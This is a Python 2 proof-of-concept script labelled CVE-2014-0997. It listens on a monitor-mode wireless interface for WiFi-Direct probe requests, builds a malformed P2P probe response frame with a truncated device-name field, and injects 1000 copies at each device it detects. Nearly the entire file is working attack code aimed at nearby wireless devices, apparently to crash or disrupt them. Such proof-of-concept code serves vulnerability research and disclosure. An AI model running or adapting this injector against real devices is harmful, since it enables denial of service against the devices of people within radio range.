#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
#
# BSD 3-Clause License
#
# Copyright (c) 2017, Andr√©s Blanco (6e726d@gmail.com)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# * Redistributions of source code must retain the above copyright notice, this
#   list of conditions and the following disclaimer.
#
# * Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
# * Neither the name of WIG nor the names of its
#   contributors may be used to endorse or promote products derived from
#   this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

from __future__ import print_function

import sys
import time
import struct

import pcapy


LINKTYPE_IEEE80211 = 105
LINKTYPE_IEEE80211_RADIOTAP = 127


def show_usage():
    """Show usage information and exit."""
    print("Usage:")
    print("\t%s <interface name>\n" % sys.argv[0])
    print("Wireless network interface must be on monitor mode and support injection.")
    sys.exit(-1)


class Vulnerability(object):
    """CVE-2014-0997"""

    @staticmethod
    def __get_radiotap__():
        buff = str()
        buff += "\x00\x00"  # header version
        buff += "\x0b\x00"  # header length
        buff += "\x04\x0c\x00\x00"  # header bitmap
        buff += "\x6c"  # rate
        buff += "\x0c"  # tx power
        buff += "\x01"  # antenna
        return buff

    @staticmethod
    def get_probe_response_frame(destination_address):
        buff = str()
        buff += Vulnerability.__get_radiotap__()
        buff += "\x50\x00"  # Frame Control
        buff += "\x00\x00"  # Duration
        # buff += "\xff\xff\xff\xff\xff\xff"  # Destination Address
        buff += destination_address
        buff += "\x00\xde\xad\xfa\xfa\xfa"  # Source Address
        buff += "\x00\xde\xad\xfa\xfa\xfa"  # Bssid Address
        buff += "\x00\x00"  # Sequence Control
        buff += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Timestamp
        buff += "\x64\x00"  # Beacon Interval
        buff += "\x30\x04"  # Capabilities
        buff += "\x00\x07DIRECT-"  # SSID
        buff += "\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c"  # Supported Rates
        buff += "\x03\x01\x01"  # DS Parameter Set
        # P2P Information Element
        p2p_ie_id = "\xdd"  # Vendor Specific ID
        p2p_ie_data = str()
        p2p_ie_data += "\x50\x6f\x9a"  # WiFi Alliance OUI
        p2p_ie_data += "\x09"  # WiFi Alliance WiFi P2P ID
        # P2P Capabilities
        p2p_ie_data += "\x02"  # Id
        p2p_ie_data += "\x02\x00"  # Length
        p2p_ie_data += "\x21\x00"
        # P2P Device Info
        p2p_ie_data += "\x0d"  # Id
        p2p_ie_data += "\x1b\x00"  # Length
        p2p_ie_data += "\x00\xde\xad\xfa\xfa\xfa"  # Source Address
        p2p_ie_data += "\x01\x88"  # Config Methods
        p2p_ie_data += "\x00\x0a\x00\x50\xf2\x04\x00\x05"  # Primary Device Type
        p2p_ie_data += "\x00"  # Number of device Types
        p2p_ie_data += "\x10\x11"  # Device Name Attribute Type
        p2p_ie_data += "\x00\x06"  # Device Name Length
        p2p_ie_data += "fafa\xfa\xfa"
        # p2p_ie_data += "fa\xfa\xfa\xfa"
        buff += p2p_ie_id + struct.pack("B", len(p2p_ie_data))[0] + p2p_ie_data
        return buff

    @staticmethod
    def mac_to_string(data):
        aux = list()
        for byte in data:
            aux.append("%02X" % ord(byte))
        return ":".join(aux)

    @staticmethod
    def get_wifi_p2p_probe_request_source_address(datalink, frame_data):
        """Returns a raw string with the address if the frame data is from a device doing an active WiFi-Direct scan."""
        if frame_data.find("\x00\x07DIRECT-") == -1:
            return None
        if datalink == LINKTYPE_IEEE80211_RADIOTAP:
            version = struct.unpack("H", frame_data[0:2])[0]
            length = struct.unpack("H", frame_data[2:4])[0]
            if version == 0:
                dot11_frame = frame_data[length:]
        else:
            dot11_frame = frame_data
        source_address = dot11_frame[10:16]
        return source_address


if __name__ == "__main__":
    if len(sys.argv) != 2:
        show_usage()

    iface_name = sys.argv[1]

    try:
        print("Injecting malformed frame.")
        print("Press Ctrl+C to exit.")
        pd = pcapy.open_live(iface_name, 65535, 0, 100)
        pd.setfilter("type mgt subtype probe-req")
        datalink = pd.datalink()
        while True:
            header, frame = pd.next()
            if frame:
                source_address = Vulnerability.get_wifi_p2p_probe_request_source_address(datalink, frame)
                if source_address:
                    string_mac_address = Vulnerability.mac_to_string(source_address)
                    print("WiFi-Direct scan from %s" % string_mac_address)
                    malformed_frame = Vulnerability.get_probe_response_frame(source_address)
                    i = 1000
                    print("Injecting %d malformed frames for device with MAC %s" % (i, string_mac_address))
                    for j in range(i):
                        pd.sendpacket(malformed_frame)
                        time.sleep(0.100)
    except KeyboardInterrupt:
        print("Caught Ctrl+C.")
        print("Exiting...")
    except Exception, e:
        import traceback
        traceback.print_stack()
        print("Exception: %s" % str(e))

